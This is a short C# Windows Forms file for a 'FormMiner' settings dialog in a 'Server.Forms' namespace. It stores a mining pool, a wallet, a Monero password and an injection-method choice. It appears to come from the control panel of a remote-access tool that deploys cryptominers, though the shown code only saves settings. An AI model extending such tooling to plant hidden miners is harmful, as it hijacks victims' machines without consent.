using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormMiner : Form
    {
        public FormMiner()
        {
            InitializeComponent();
        }

        private void BtnOK_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(txtPool.Text) && !string.IsNullOrWhiteSpace(txtWallet.Text) && !string.IsNullOrWhiteSpace(txtPass.Text))
            {
                this.DialogResult = DialogResult.OK;
                Properties.Settings.Default.Save();
                this.Hide();
            }
        }

        private void FormMiner_Load(object sender, EventArgs e)
        {
            try
            {
                comboInjection.SelectedIndex = 0;
                txtPool.Text = Properties.Settings.Default.txtPool;
                txtWallet.Text = Properties.Settings.Default.txtWallet;
                txtPass.Text = Properties.Settings.Default.txtxmrPass;
            }
            catch { }
        }
    }
}
